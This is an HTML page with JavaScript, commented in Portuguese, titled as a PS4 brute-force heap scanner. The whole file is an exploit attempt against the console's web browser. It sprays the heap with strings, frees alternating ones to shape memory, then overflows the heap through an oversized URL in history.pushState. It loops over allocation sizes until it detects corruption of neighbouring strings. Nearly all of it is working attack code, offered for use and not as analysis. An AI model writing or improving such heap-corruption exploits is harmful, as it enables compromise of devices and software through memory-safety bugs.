<!DOCTYPE html>
<html>
<head>
    <title>PS4 Brute Force Heap Scanner</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 10px; text-align: left; }
        #status-bar { 
            position: fixed; top: 0; left: 0; width: 100%; height: 60px; 
            background: #222; border-bottom: 2px solid #0f0; z-index: 100;
            display: flex; align-items: center; padding-left: 20px; font-size: 24px; font-weight: bold;
        }
        #log { margin-top: 80px; height: 80vh; overflow-y: scroll; padding: 10px; font-size: 14px; color: #aaa; }
        .success { background-color: #00aa00; color: #fff; padding: 10px; font-size: 30px; font-weight: bold; border: 4px solid #fff; }
        .current { color: yellow; }
        button { position: fixed; top: 10px; right: 20px; padding: 10px; font-size: 18px; cursor: pointer; z-index: 101; }
    </style>
</head>
<body>

    <div id="status-bar">Status: <span id="main-status">Pronto</span></div>
    <button onclick="startBruteForce()">INICIAR ATAQUE TOTAL</button>
    <div id="log">Logs aparecerão aqui...</div>

    <script>
        const BASE_OFFSET = 709522;
        const OVERFLOW_AMT = 1024 * 64; // 64KB de excesso é suficiente para corromper o header

        // --- CONFIGURAÇÃO DA FORÇA BRUTA ---
        const START_SIZE = 1024 * 256;  // Começa em 256 KB
        const END_SIZE   = 1024 * 8192; // Vai até 8 MB
        const STEP_SIZE  = 1024 * 64;   // Aumenta de 64 em 64 KB (Muita precisão)

        var victims = []; // Global para evitar GC prematuro

        function log(msg, type) {
            const el = document.getElementById('log');
            let color = type === 'success' ? '#0f0' : (type === 'warn' ? 'yellow' : '#aaa');
            let entry = `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.innerHTML += entry;
            el.scrollTop = el.scrollHeight;
        }

        function setStatus(msg) {
            document.getElementById('main-status').innerText = msg;
        }

        async function startBruteForce() {
            log("Iniciando Varredura Bruta de " + (START_SIZE/1024) + "KB até " + (END_SIZE/1024) + "KB...");
            
            for (let size = START_SIZE; size <= END_SIZE; size += STEP_SIZE) {
                let sizeMB = (size / 1024 / 1024).toFixed(4);
                setStatus("TESTANDO: " + sizeMB + " MB (" + size + " bytes)");
                
                // Tenta rodar o exploit com este tamanho
                let result = await runAttempt(size);

                if (result.success) {
                    // VITÓRIA
                    let winMsg = "!!! SUCESSO !!! TAMANHO MÁGICO: " + size + " bytes (" + sizeMB + " MB)";
                    setStatus(winMsg);
                    document.getElementById('log').innerHTML += `<div class="success">${winMsg}</div>`;
                    alert(winMsg); // Trava a tela para você ver
                    return; // Para tudo
                } else {
                    // FALHA - Limpeza
                    log(`Falha em ${sizeMB} MB. Limpando memória...`);
                    victims = null; // Libera memória
                    await forceGC(); // Tenta forçar o lixeiro
                }
            }
            log("Varredura completa. Nenhum alvo atingido.");
        }

        function runAttempt(targetSize) {
            return new Promise(resolve => {
                setTimeout(() => {
                    try {
                        // 1. Definição do Spray
                        // Strings são melhores vítimas agora (String-to-String attack)
                        const SPRAY_COUNT = 80; // Número moderado para não estourar RAM rápido demais
                        
                        // Cria a string base do tamanho exato
                        // targetSize / 1 (assumindo Latin1) ou /2 (se UTF16). 
                        // Vamos tentar preencher bytes brutos.
                        let pad = "B".repeat(targetSize); 

                        victims = [];
                        
                        // 2. Alocação (Spray)
                        for (let i = 0; i < SPRAY_COUNT; i++) {
                            // Prefixo para identificar a vítima e impedir deduplicação de strings pelo motor JS
                            let prefix = i.toString() + "_"; 
                            let final = prefix + pad.substring(prefix.length);
                            victims.push(final);
                        }

                        // 3. Criar Buracos (Feng Shui)
                        // Apaga índices pares
                        for (let i = 0; i < SPRAY_COUNT; i += 2) {
                            victims[i] = null;
                        }

                        // Pequeno delay para o GC abrir os buracos
                        setTimeout(() => {
                            // 4. O Ataque
                            let buffer = "A".repeat(BASE_OFFSET);
                            buffer += "\x01".repeat(OVERFLOW_AMT);

                            // PushState
                            history.pushState({}, "fuzz_" + targetSize, "/" + buffer);

                            // 5. Checagem
                            let hit = false;
                            for (let i = 1; i < victims.length; i+=2) {
                                let v = victims[i];
                                if (v && v.length !== targetSize) {
                                    hit = true;
                                    log("CORRUPÇÃO DETECTADA! Index: " + i + " | Tam Original: " + targetSize + " | Novo: " + v.length, 'success');
                                    break;
                                }
                                // Checagem secundária de conteúdo (se o primeiro char mudou)
                                if (v && v.charCodeAt(0) === 1) {
                                    hit = true;
                                    log("CONTEÚDO CORROMPIDO! Index: " + i, 'success');
                                    break;
                                }
                            }
                            resolve({ success: hit });

                        }, 200); // Delay do GC

                    } catch (e) {
                        log("Erro Crítico (OOM?): " + e.message, 'warn');
                        // Se der erro de memória, tentamos continuar ou paramos?
                        // Melhor continuar para o próximo tamanho se possível.
                        resolve({ success: false });
                    }
                }, 100);
            });
        }

        async function forceGC() {
            try {
                // Aloca um buffer grande e solta imediatamente para pressionar o GC
                new ArrayBuffer(32 * 1024 * 1024);
            } catch(e) {}
            // Espera o sistema respirar
            return new Promise(r => setTimeout(r, 500));
        }
    </script>
</body>
</html>
